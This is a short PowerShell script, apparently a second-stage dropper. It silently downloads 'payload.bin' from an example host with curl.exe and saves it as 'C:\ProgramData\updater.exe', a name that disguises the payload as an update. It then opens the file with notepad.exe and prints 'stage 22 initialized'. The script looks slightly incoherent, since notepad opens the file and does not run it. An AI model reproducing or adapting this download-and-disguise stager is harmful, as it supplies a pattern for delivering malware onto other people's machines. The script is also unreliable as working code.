
$Stage2Url = "http://adatum.com/downloads/payload.bin"
$PayloadPath = "C:\ProgramData\updater.exe"
curl.exe -s -L -o $PayloadPath $Stage2Url
Start-Process -FilePath "notepad.exe" -ArgumentList $PayloadPath
Set-Location -Path $env:TEMP
Write-Output "stage 22 initialized"
